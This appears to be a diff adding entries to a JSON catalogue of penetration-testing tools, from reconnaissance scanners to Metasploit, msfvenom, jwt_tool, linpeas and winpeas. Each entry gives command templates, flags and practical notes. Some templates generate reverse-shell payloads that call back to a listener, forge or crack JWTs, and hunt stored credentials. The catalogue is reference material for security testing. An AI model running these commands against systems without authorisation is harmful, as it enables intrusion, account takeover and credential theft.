+          "label": "Parameterised URLs only",
+          "template": "waybackurls <domain> | grep '?' | sort -u > <output>",
+          "note": "Feeds arjun, ffuf or a manual review of the parameter surface."
+        },
+        {
+          "label": "Interesting file types",
+          "template": "waybackurls <domain> | grep -Ei '\\.(json|xml|sql|bak|config|env)$' | sort -u",
+          "note": "Archived backups and configs are a recurring source of leaked secrets."
+        }
+      ],
+      "flags": [
+        {"flag": "-dates", "what": "prefix each URL with its capture date"},
+        {"flag": "-no-subs", "what": "exclude subdomains"},
+        {"flag": "-get-versions", "what": "list every archived version of a URL"}
+      ]
+    },
+    {
+      "name": "dirsearch",
+      "category": "web",
+      "purpose": "Content discovery with sensible defaults — extension expansion, status filtering and recursion built in, so it needs less tuning than a raw fuzzer for a first pass.",
+      "phases": ["enumeration"],
+      "techniques": ["directory brute force", "file discovery", "backup file discovery"],
+      "docs": "https://github.com/maurosoria/dirsearch",
+      "templates": [
+        {
+          "label": "Discovery with extension expansion",
+          "template": "dirsearch -u <url> -e php,asp,aspx,jsp,html,txt -x 400,403,404 -o <output>",
+          "note": "-e appends each extension to every word; -x drops uninteresting statuses."
+        },
+        {
+          "label": "Custom wordlist, tuned concurrency",
+          "template": "dirsearch -u <url> -w <wordlist> -t 50 -o <output>",
+          "note": "Drop -t well below 50 on anything rate-limited or fragile."
+        },
+        {
+          "label": "Recursive into discovered directories",
+          "template": "dirsearch -u <url> -r --max-recursion-depth 2 -o <output>",
+          "note": "Cap the depth — unbounded recursion turns into a denial of service."
+        },
+        {
+          "label": "Hunt backup and config leftovers",
+          "template": "dirsearch -u <url> -e bak,old,swp,zip,tar.gz,sql -o <output>",
+          "note": "Editor and deploy leftovers next to a known file are a common source of source-code disclosure."
+        }
+      ],
+      "flags": [
+        {"flag": "-e", "what": "extensions to append"},
+        {"flag": "-x", "what": "exclude status codes"},
+        {"flag": "-r", "what": "recurse into found directories"},
+        {"flag": "-t", "what": "threads"},
+        {"flag": "--exclude-sizes", "what": "filter by response size"}
+      ]
+    },
+    {
+      "name": "wafw00f",
+      "category": "web",
+      "purpose": "Fingerprints which WAF sits in front of an application. Informational, and worth running early: it explains 403s that would otherwise read as 'not vulnerable'.",
+      "phases": ["recon", "enumeration"],
+      "techniques": ["WAF fingerprinting", "defensive stack identification"],
+      "docs": "https://github.com/EnableSecurity/wafw00f",
+      "templates": [
+        {
+          "label": "Fingerprint the WAF",
+          "template": "wafw00f <url>",
+          "note": "Sends a small number of benign probes and matches the responses."
+        },
+        {
+          "label": "Test every known signature",
+          "template": "wafw00f -a <url>",
+          "note": "-a keeps going after the first match — some stacks run two WAFs."
+        },
+        {
+          "label": "Check a list of hosts",
+          "template": "wafw00f -i <file> -o <output>",
+          "note": "Tells you which hosts in scope are actually defended."
+        }
+      ],
+      "flags": [
+        {"flag": "-a", "what": "find all matches, not just the first"},
+        {"flag": "-i", "what": "input file of URLs"},
+        {"flag": "-l", "what": "list the WAFs it can detect"},
+        {"flag": "-o", "what": "output file"}
+      ]
+    },
+    {
+      "name": "testssl.sh",
+      "aliases": ["testssl"],
+      "category": "web",
+      "purpose": "Thorough TLS assessment — protocols, ciphers, certificate chain and the named TLS vulnerabilities — from a single script with no dependencies to install.",
+      "phases": ["enumeration"],
+      "techniques": ["TLS configuration review", "cipher enumeration", "certificate inspection", "protocol downgrade checks"],
+      "docs": "https://testssl.sh/",
+      "templates": [
+        {
+          "label": "Full assessment",
+          "template": "testssl.sh --quiet --color 0 <target>",
+          "note": "Accepts host, host:port or a URL. Non-invasive — it negotiates handshakes only."
+        },
+        {
+          "label": "Known TLS vulnerabilities only",
+          "template": "testssl.sh -U --sneaky <target>",
+          "note": "-U runs the vulnerability battery; --sneaky uses a less obvious user agent."
+        },
+        {
+          "label": "Protocols and ciphers by strength",
+          "template": "testssl.sh -p -E <target>",
+          "note": "The pair that answers 'is anything weak still enabled'."
+        },
+        {
+          "label": "Machine-readable output",
+          "template": "testssl.sh --jsonfile <output> <target>",
+          "note": "JSON for diffing across retests or feeding into a report."
+        }
+      ],
+      "flags": [
+        {"flag": "-U", "what": "test all vulnerabilities"},
+        {"flag": "-p", "what": "protocol support"},
+        {"flag": "-E", "what": "ciphers per protocol"},
+        {"flag": "--jsonfile", "what": "JSON output"},
+        {"flag": "--sneaky", "what": "less conspicuous user agent"}
+      ]
+    },
+    {
+      "name": "jwt_tool",
+      "aliases": ["jwt-tool", "jwt_tool.py"],
+      "category": "web",
+      "purpose": "JWT analysis and attack toolkit — decodes a token, then tests the signature-handling flaws (alg confusion, alg:none, weak HMAC secrets, kid injection) that turn a token into an authentication bypass.",
+      "phases": ["enumeration", "exploitation", "privesc"],
+      "techniques": ["JWT decoding", "algorithm confusion", "alg:none bypass", "HMAC secret cracking", "kid injection"],
+      "docs": "https://github.com/ticarpi/jwt_tool",
+      "templates": [
+        {
+          "label": "Decode and inspect a token",
+          "template": "jwt_tool <token>",
+          "note": "Always the first step — the header's alg and kid decide which attacks apply."
+        },
+        {
+          "label": "Run the full attack playbook against a live endpoint",
+          "template": "jwt_tool -t <url> -rc 'jwt=<token>' -M at",
+          "note": "-M at runs all tests and reports which the server accepted."
+        },
+        {
+          "label": "Crack a weak HMAC secret",
+          "template": "jwt_tool <token> -C -d <wordlist>",
+          "note": "Entirely offline. A cracked secret means you can mint arbitrary tokens."
+        },
+        {
+          "label": "Forge with alg:none",
+          "template": "jwt_tool <token> -X a",
+          "note": "-X a strips the signature; -X k is key confusion, -X i is kid injection."
+        }
+      ],
+      "flags": [
+        {"flag": "-M", "what": "scan mode: pb (playbook), at (all tests)"},
+        {"flag": "-C -d", "what": "crack the secret with a dictionary"},
+        {"flag": "-X", "what": "exploit: a=alg:none, k=key confusion, i=kid injection"},
+        {"flag": "-T", "what": "interactive tampering"}
+      ]
+    },
+    {
+      "name": "wfuzz",
+      "category": "web",
+      "purpose": "General-purpose HTTP fuzzer built around response filtering — its strength is subtractive: baseline the noise, hide it, and whatever remains is the anomaly.",
+      "phases": ["enumeration", "exploitation"],
+      "techniques": ["directory fuzzing", "parameter value fuzzing", "vhost discovery", "response-difference analysis"],
+      "docs": "https://wfuzz.readthedocs.io/",
+      "templates": [
+        {
+          "label": "Directory fuzz",
+          "template": "wfuzz -c -z file,<wordlist> --hc 404 <url>/FUZZ",
+          "note": "FUZZ marks the injection point; --hc hides a status code."
+        },
+        {
+          "label": "Parameter value fuzz with a baseline filter",
+          "template": "wfuzz -c -z file,<wordlist> --hh <size> <url>?<param>=FUZZ",
+          "note": "--hh hides the common response length so only the different one shows."
+        },
+        {
+          "label": "Virtual host discovery",
+          "template": "wfuzz -c -z file,<wordlist> -H 'Host: FUZZ.<domain>' --hw <size> <url>",
+          "note": "Finds name-based vhosts the default site never links to."
+        },
+        {
+          "label": "Authenticated fuzzing with a rate limit",
+          "template": "wfuzz -c -z file,<wordlist> -b 'session=<token>' -s 1 --hc 404 <url>/FUZZ",
+          "note": "-b sends a cookie; -s adds a delay between requests."
+        }
+      ],
+      "flags": [
+        {"flag": "-z", "what": "payload source (file, range, list)"},
+        {"flag": "--hc / --hl / --hw / --hh", "what": "hide by code / lines / words / chars"},
+        {"flag": "-H", "what": "custom header"},
+        {"flag": "-b", "what": "cookie"},
+        {"flag": "-s", "what": "delay between requests"}
+      ]
+    },
+    {
+      "name": "hakrawler",
+      "category": "web",
+      "purpose": "Minimal, fast crawler for endpoints, JS files and subdomains — deliberately unix-y, so it slots into a pipeline between host discovery and parameter mining.",
+      "phases": ["recon", "enumeration"],
+      "techniques": ["web crawling", "JS discovery", "endpoint harvesting"],
+      "docs": "https://github.com/hakluke/hakrawler",
+      "templates": [
+        {
+          "label": "Crawl a URL",
+          "template": "echo <url> | hakrawler -d 2 -u",
+          "note": "Reads targets on stdin; -u deduplicates."
+        },
+        {
+          "label": "Deeper crawl including subdomains",
+          "template": "echo <url> | hakrawler -d 3 -subs -u | tee <output>",
+          "note": "-subs follows links onto sibling subdomains — check scope before using it."
+        },
+        {
+          "label": "With an authenticated session",
+          "template": "echo <url> | hakrawler -h 'Cookie: session=<token>' -d 2 -u",
+          "note": "Authenticated crawls usually reveal several times more surface."
+        }
+      ],
+      "flags": [
+        {"flag": "-d", "what": "crawl depth"},
+        {"flag": "-subs", "what": "include subdomains"},
+        {"flag": "-u", "what": "unique results only"},
+        {"flag": "-h", "what": "custom header"}
+      ]
+    },
+    {
+      "name": "sslscan",
+      "category": "web",
+      "purpose": "Quick cipher and protocol enumeration for a TLS service — narrower and much faster than testssl.sh, which makes it the right tool when sweeping many hosts.",
+      "phases": ["enumeration"],
+      "techniques": ["cipher enumeration", "protocol support checks", "certificate inspection"],
+      "docs": "https://github.com/rbsec/sslscan",
+      "templates": [
+        {
+          "label": "Enumerate ciphers and protocols",
+          "template": "sslscan <target>",
+          "note": "Colour-codes weak ciphers. Add :port for a non-443 service."
+        },
+        {
+          "label": "Certificate detail only",
+          "template": "sslscan --show-certificate --no-ciphersuites <target>",
+          "note": "Certificate SANs frequently name internal hosts worth adding to scope."
+        },
+        {
+          "label": "STARTTLS on a mail service",
+          "template": "sslscan --starttls-smtp <target>",
+          "note": "Also --starttls-imap, --starttls-pop3, --starttls-ftp."
+        }
+      ],
+      "flags": [
+        {"flag": "--show-certificate", "what": "print certificate details"},
+        {"flag": "--no-ciphersuites", "what": "skip cipher enumeration"},
+        {"flag": "--starttls-*", "what": "negotiate STARTTLS for that protocol"},
+        {"flag": "--targets", "what": "file of hosts"}
+      ]
+    },
+    {
+      "name": "rustscan",
+      "category": "recon",
+      "purpose": "Very fast port sweep that hands its findings straight to nmap for service detection — the practical answer to 'nmap -p- takes too long'.",
+      "phases": ["recon"],
+      "techniques": ["fast port scanning", "nmap hand-off", "adaptive scan rate"],
+      "docs": "https://github.com/bee-san/RustScan",
+      "templates": [
+        {
+          "label": "Full sweep, then nmap on what it found",
+          "template": "rustscan -a <target> --ulimit 5000 -- -sCV -oA <output>",
+          "note": "Everything after -- is passed to nmap, against only the open ports."
+        },
+        {
+          "label": "Specific port range",
+          "template": "rustscan -a <target> -r <ports> --ulimit 5000",
+          "note": "Use when a full sweep is too loud or too slow for the window."
+        },
+        {
+          "label": "Gentler batch size for a fragile host",
+          "template": "rustscan -a <target> -b 500 --ulimit 5000 -- -sCV",
+          "note": "The default rate can knock over embedded or heavily-filtered targets."
+        }
+      ],
+      "flags": [
+        {"flag": "-a", "what": "address(es) to scan"},
+        {"flag": "--ulimit", "what": "raise the file-descriptor limit (needed for speed)"},
+        {"flag": "-b", "what": "batch size — lower is gentler"},
+        {"flag": "-r", "what": "port range"},
+        {"flag": "--", "what": "pass the rest to nmap"}
+      ]
+    },
+    {
+      "name": "naabu",
+      "category": "recon",
+      "purpose": "SYN/CONNECT port scanner built for pipelines — fast, quiet by default and designed to feed httpx or nuclei directly.",
+      "phases": ["recon"],
+      "techniques": ["port scanning", "host discovery", "pipeline scanning"],
+      "docs": "https://github.com/projectdiscovery/naabu",
+      "templates": [
+        {
+          "label": "Top ports on a host",
+          "template": "naabu -host <target> -top-ports 1000 -o <output>",
+          "note": "SYN scan needs root; it falls back to CONNECT without it."
+        },
+        {
+          "label": "Full sweep piped into httpx",
+          "template": "naabu -host <target> -p - -silent | httpx -silent -o <output>",
+          "note": "Ports straight to live-HTTP detection in one pass."
+        },
+        {
+          "label": "Scan a host list with a rate cap",
+          "template": "naabu -list <file> -top-ports 100 -rate 500 -o <output>",
+          "note": "-rate is the packets/sec ceiling — the knob for staying under IDS thresholds."
+        },
+        {
+          "label": "Hand off to nmap for service detection",
+          "template": "naabu -host <target> -p - -nmap-cli 'nmap -sCV' -o <output>",
+          "note": "Same two-phase pattern as rustscan."
+        }
+      ],
+      "flags": [
+        {"flag": "-top-ports", "what": "scan the N most common ports"},
+        {"flag": "-p -", "what": "all 65535 ports"},
+        {"flag": "-rate", "what": "packets per second cap"},
+        {"flag": "-nmap-cli", "what": "nmap command to run on the results"}
+      ]
+    },
+    {
+      "name": "dnsrecon",
+      "category": "recon",
+      "purpose": "Broad DNS enumeration — standard records, subdomain brute force, reverse lookups, cache snooping and zone transfers in one tool.",
+      "phases": ["recon"],
+      "techniques": ["DNS enumeration", "zone transfer", "subdomain brute force", "reverse DNS sweep", "SRV record discovery"],
+      "docs": "https://github.com/darkoperator/dnsrecon",
+      "templates": [
+        {
+          "label": "Standard record enumeration",
+          "template": "dnsrecon -d <domain>",
+          "note": "SOA, NS, MX, A, TXT and SRV — the free information before anything noisy."
+        },
+        {
+          "label": "Attempt a zone transfer",
+          "template": "dnsrecon -d <domain> -t axfr",
+          "note": "Rarely works, and hands over the entire zone when it does. Always worth one try."
+        },
+        {
+          "label": "Brute-force subdomains",
+          "template": "dnsrecon -d <domain> -D <wordlist> -t brt",
+          "note": "Catches names that no certificate log or archive ever recorded."
+        },
+        {
+          "label": "SRV records — locate AD services",
+          "template": "dnsrecon -d <domain> -t srv",
+          "note": "In an AD environment this names the domain controllers directly."
+        }
+      ],
+      "flags": [
+        {"flag": "-t", "what": "type: std, axfr, brt, srv, rvl, snoop"},
+        {"flag": "-D", "what": "subdomain wordlist"},
+        {"flag": "-n", "what": "specific nameserver to query"},
+        {"flag": "--json", "what": "JSON output"}
+      ]
+    },
+    {
+      "name": "shodan",
+      "category": "recon",
+      "purpose": "Queries Shodan's existing internet-wide scan index. Entirely passive — it reports what Shodan already saw, so the target receives no traffic from you at all.",
+      "phases": ["recon"],
+      "techniques": ["passive service discovery", "banner intelligence", "historical port data", "exposure discovery"],
+      "docs": "https://cli.shodan.io/",
+      "templates": [
+        {
+          "label": "One-time API key setup",
+          "template": "shodan init <api-key>",
+          "note": "Stored locally; needed once before any other subcommand."
+        },
+        {
+          "label": "What Shodan already knows about a host",
+          "template": "shodan host <target>",
+          "note": "Open ports, banners and history without sending the target a packet."
+        },
+        {
+          "label": "Search the index",
+          "template": "shodan search --fields ip_str,port,org '<query>'",
+          "note": "Query syntax supports org:, ssl:, http.title:, product: filters."
+        },
+        {
+          "label": "All indexed hosts under a domain",
+          "template": "shodan domain <domain>",
+          "note": "Subdomains plus the ports Shodan last saw open on each."
+        }
+      ],
+      "flags": [
+        {"flag": "host", "what": "look up one address"},
+        {"flag": "search", "what": "query the index"},
+        {"flag": "--fields", "what": "columns to print"},
+        {"flag": "domain", "what": "domain-wide view"}
+      ]
+    },
+    {
+      "name": "fierce",
+      "category": "recon",
+      "purpose": "DNS reconnaissance that also walks the address ranges around what it finds — good at locating the non-contiguous netblocks an organisation actually uses.",
+      "phases": ["recon"],
+      "techniques": ["DNS enumeration", "subdomain brute force", "adjacent netblock discovery", "zone transfer"],
+      "docs": "https://github.com/mschwager/fierce",
+      "templates": [
+        {
+          "label": "Enumerate a domain",
+          "template": "fierce --domain <domain>",
+          "note": "Tries a zone transfer first, then brute-forces, then scans nearby addresses."
+        },
+        {
+          "label": "With a custom subdomain wordlist",
+          "template": "fierce --domain <domain> --subdomain-file <wordlist>",
+          "note": "The default list is small — a targeted one finds considerably more."
+        },
+        {
+          "label": "Widen the adjacent-address sweep",
+          "template": "fierce --domain <domain> --traverse 10",
+          "note": "Checks N addresses either side of each hit for related hosts."
+        }
+      ],
+      "flags": [
+        {"flag": "--domain", "what": "domain to enumerate"},
+        {"flag": "--subdomain-file", "what": "wordlist"},
+        {"flag": "--traverse", "what": "how far to walk around each found address"},
+        {"flag": "--dns-servers", "what": "resolvers to use"}
+      ]
+    },
+    {
+      "name": "msfconsole",
+      "aliases": ["metasploit", "msf"],
+      "category": "exploitation",
+      "purpose": "The Metasploit console — a large library of exploit, auxiliary and post modules with a common interface for configuring, checking and running them.",
+      "phases": ["exploitation", "post-exploitation"],
+      "techniques": ["exploit module execution", "auxiliary scanning", "payload handling", "post-exploitation modules"],
+      "docs": "https://docs.metasploit.com/",
+      "templates": [
+        {
+          "label": "Search for a module",
+          "template": "msfconsole -q -x 'search <query>; exit'",
+          "note": "-q quiet, -x runs commands non-interactively. Search by CVE, product or name."
+        },
+        {
+          "label": "Check exploitability WITHOUT exploiting",
+          "template": "msfconsole -q -x 'use <module>; set RHOSTS <target>; check; exit'",
+          "note": "Many modules support check — confirm before firing anything."
+        },
+        {
+          "label": "Run a module against the target",
+          "template": "msfconsole -q -x 'use <module>; set RHOSTS <target>; set LPORT <listener-port>; run; exit'",
+          "note": "Read the module's options and description first; some are destructive."
+        },
+        {
+          "label": "Handler for an incoming callback",
+          "template": "msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD <payload>; set LHOST <listener>; set LPORT <listener-port>; run'",
+          "note": "LHOST is YOUR address, not the target's — it is where the shell connects back to."
+        }
+      ],
+      "flags": [
+        {"flag": "-q", "what": "no banner"},
+        {"flag": "-x", "what": "run these console commands"},
+        {"flag": "-r", "what": "run a resource script"},
+        {"flag": "set RHOSTS", "what": "the target"},
+        {"flag": "set LHOST", "what": "your callback address"}
+      ]
+    },
+    {
+      "name": "msfvenom",
+      "category": "exploitation",
+      "purpose": "Metasploit's standalone payload generator — builds a shell or agent for a given platform and output format, with optional encoding and bad-character avoidance.",
+      "phases": ["exploitation"],
+      "techniques": ["payload generation", "shellcode generation", "format conversion", "bad character avoidance"],
+      "docs": "https://docs.metasploit.com/docs/using-metasploit/basics/how-to-use-msfvenom.html",
+      "templates": [
+        {
+          "label": "Windows reverse TCP executable",
+          "template": "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<listener> LPORT=<listener-port> -f exe -o <output>",
+          "note": "LHOST is your callback address. Pair with a multi/handler before delivering it."
+        },
+        {
+          "label": "Linux ELF reverse shell",
+          "template": "msfvenom -p linux/x64/shell_reverse_tcp LHOST=<listener> LPORT=<listener-port> -f elf -o <output>",
+          "note": "Staged (meterpreter) vs stageless (shell_reverse_tcp) matters when egress is filtered."
+        },
+        {
+          "label": "Web payload for an upload or deploy path",
+          "template": "msfvenom -p java/jsp_shell_reverse_tcp LHOST=<listener> LPORT=<listener-port> -f war -o <output>",
+          "note": "Also php/meterpreter/reverse_tcp -f raw, or windows/.../reverse_tcp -f aspx."
+        },
+        {
+          "label": "Raw shellcode avoiding bad characters",
+          "template": "msfvenom -p <payload> LHOST=<listener> LPORT=<listener-port> -f c -b '\\x00\\x0a\\x0d' -o <output>",
+          "note": "-b excludes bytes the vulnerable parser would truncate on."
+        },
+        {
+          "label": "List available payloads",
+          "template": "msfvenom --list payloads | grep <pattern>",
+          "note": "Purely informational — generates nothing."
+        }
+      ],
+      "flags": [
+        {"flag": "-p", "what": "payload"},
+        {"flag": "-f", "what": "output format (exe, elf, raw, war, aspx, c, py)"},
+        {"flag": "-b", "what": "bad characters to avoid"},
+        {"flag": "-e", "what": "encoder"},
+        {"flag": "-o", "what": "output file"}
+      ]
+    },
+    {
+      "name": "searchsploit",
+      "aliases": ["exploitdb"],
+      "category": "exploitation",
+      "purpose": "Offline search over the Exploit-DB archive — maps a product and version from your service enumeration to public exploit code already on disk.",
+      "phases": ["enumeration", "exploitation"],
+      "techniques": ["public exploit lookup", "version-to-exploit mapping", "offline exploit archive search"],
+      "docs": "https://www.exploit-db.com/searchsploit",
+      "templates": [
+        {
+          "label": "Search by product and version",
+          "template": "searchsploit <query>",
+          "note": "Fully offline. Keep the terms short — over-specific version strings miss."
+        },
+        {
+          "label": "Show the path to an exploit",
+          "template": "searchsploit -p <query>",
+          "note": "Prints the full local path and copies it to the clipboard where available."
+        },
+        {
+          "label": "Copy an exploit into the working directory",
+          "template": "searchsploit -m <query>",
+          "note": "Mirror, then READ the source before running it — many need editing, some are hostile."
+        },
+        {
+          "label": "Match an nmap scan against the archive",
+          "template": "searchsploit --nmap <file>",
+          "note": "Takes the XML from nmap -oX / -oA and looks up every detected service."
+        }
+      ],
+      "flags": [
+        {"flag": "-p", "what": "show the exploit's path"},
+        {"flag": "-m", "what": "mirror (copy) the exploit locally"},
+        {"flag": "-x", "what": "examine the exploit"},
+        {"flag": "--nmap", "what": "search from an nmap XML file"},
+        {"flag": "-t", "what": "search titles only"}
+      ]
+    },
+    {
+      "name": "linpeas",
+      "aliases": ["linpeas.sh"],
+      "category": "privesc",
+      "purpose": "Linux privilege-escalation enumeration script — runs hundreds of local checks and colour-codes what it finds by how likely it is to be exploitable.",
+      "phases": ["privesc", "post-exploitation"],
+      "techniques": ["local enumeration", "SUID/SGID discovery", "sudo misconfiguration", "cron and writable path analysis", "credential hunting"],
+      "docs": "https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS",
+      "templates": [
+        {
+          "label": "Full enumeration, output kept",
+          "template": "./linpeas.sh -a | tee <output>",
+          "note": "-a is the thorough pass. Red-on-yellow findings are the ones worth reading first."
+        },
+        {
+          "label": "Targeted sections only",
+          "template": "./linpeas.sh -o SysI,Devs,ProCronSrvcsTmrsSocks",
+          "note": "Much quicker and far less noise when you already know what you are looking for."
+        },
+        {
+          "label": "Quiet mode without colour",
+          "template": "./linpeas.sh -q -N > <output>",
+          "note": "Plain text for a report or for grepping offline."
+        }
+      ],
+      "flags": [
+        {"flag": "-a", "what": "all checks (slower, thorough)"},
+        {"flag": "-o", "what": "run only the named sections"},
+        {"flag": "-q", "what": "quiet"},
+        {"flag": "-N", "what": "no colour"}
+      ]
+    },
+    {
+      "name": "winpeas",
+      "aliases": ["winPEASx64", "winPEASx86", "winPEASany", "winPEAS.exe", "winpeas.bat"],
+      "category": "privesc",
+      "purpose": "The Windows counterpart to linpeas — enumerates services, registry, credentials, tokens and installed software, highlighting the misconfigurations that lead to SYSTEM.",
+      "phases": ["privesc", "post-exploitation"],
+      "techniques": ["local enumeration", "unquoted service path discovery", "token privilege analysis", "stored credential hunting", "AlwaysInstallElevated checks"],
+      "docs": "https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS",
+      "templates": [
+        {
+          "label": "Full enumeration to a log file",
+          "template": "winPEASx64.exe log=<output>",
+          "note": "Very loud on an EDR-monitored host — expect it to be detected."
+        },
+        {
+          "label": "Targeted modules only",
+          "template": "winPEASx64.exe systeminfo userinfo servicesinfo",
+          "note": "Faster and much quieter than the full sweep."
+        },
+        {
+          "label": "Search for stored credentials",
+          "template": "winPEASx64.exe cmd searchfast filesinfo",
+          "note": "Saved credentials in files and the registry are the most common quick win."
+        }
+      ],
+      "flags": [
+        {"flag": "log=", "what": "write output to a file"},
+        {"flag": "quiet", "what": "suppress the banner"},
+        {"flag": "notcolor", "what": "no ANSI colour"},
+        {"flag": "searchfast", "what": "faster, shallower file search"}
       ]
     }
   ]
